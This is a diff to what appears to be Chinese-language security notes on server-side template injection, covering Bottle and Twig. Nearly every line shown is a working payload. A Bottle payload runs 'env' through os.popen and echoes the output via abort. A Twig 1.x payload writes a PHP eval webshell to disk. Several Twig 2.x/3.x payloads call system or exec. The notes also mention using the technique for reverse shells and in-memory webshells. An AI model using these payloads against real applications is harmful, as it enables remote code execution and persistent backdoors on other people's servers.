@@ -37,7 +37,7 @@ func sstiHandler(w http.ResponseWriter, r *http.Request) {
 bottle 可以直接通过 `% python—code `或 `<% %>`执行, 但无回显，可以反弹shell或者打内存马
 通过abort可以直接回显
 
-```payload
+```python
 %__import__('bottle').abort(404,__import__(%27os%27).popen('env').read())
 ```
 
@@ -70,7 +70,7 @@ bottle.run
 
 https://xz.aliyun.com/news/9506
 
-1. 1.x版本payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > flag.php")}}`
+1. 1.x版本payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > /tmp/flag.php")}}`
 2. 2.x/3.x 版本payload：`{{["ls"]|map("system")}}`或者`{{["id"]|filter("system")}}`或者`{{["id", 0]|sort("system")}}`或者`{{[0, 0]|reduce("exec", "id")}}`
 
 ## smarty模板注入
